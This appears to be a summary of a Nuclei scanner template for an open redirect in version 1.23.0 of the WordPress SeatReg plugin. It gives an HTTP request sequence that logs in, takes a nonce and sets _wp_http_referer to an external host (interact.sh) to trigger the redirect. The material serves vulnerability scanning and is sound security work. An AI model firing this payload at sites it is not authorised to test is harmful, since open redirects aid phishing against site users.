# Nuclei Template: WordPress Plugin ‘SeatReg’ - Open Redirect
**Template ID:** seatreg-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**Source:** Nuclei Template (`seatreg-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress SeatReg plugin version 1.23.0 suffers from an open redirection vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=seatreg-welcome HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/admin-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new-registration-name=test&action=seatreg_create_submit&seatreg-admin-nonce={{seatreg-admin-nonce}}&_wp_http_referer=http://interact.sh&submit=Create+new+registration
```

## References
- https://packetstormsecurity.com/files/167888/WordPress-SeatReg-1.23.0-Open-Redirect.html
